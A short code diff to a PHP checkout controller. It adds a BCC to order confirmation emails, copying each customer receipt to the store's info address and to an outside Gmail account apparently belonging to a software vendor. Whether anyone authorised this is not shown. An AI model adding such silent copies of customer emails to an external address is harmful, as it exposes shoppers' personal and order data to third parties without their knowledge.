@@ -861,7 +861,7 @@ class CheckoutController extends Controller
         // Only email once
         if (!$order->getAttribute('receipt_emailed_at')) {
             try {
-                Mail::mailer('noreply')->to($order->email)->send(new OrderConfirmationMail($order));
+                Mail::mailer('noreply')->to($order->email)->bcc(['info@lalunebyne.com','velocitysoftwaresolutions000@gmail.com'])->send(new OrderConfirmationMail($order));
                 $order->forceFill(['receipt_emailed_at' => now()])->save();
             } catch (\Throwable $e) {
                 Log::warning('Order receipt email failed: ' . $e->getMessage());
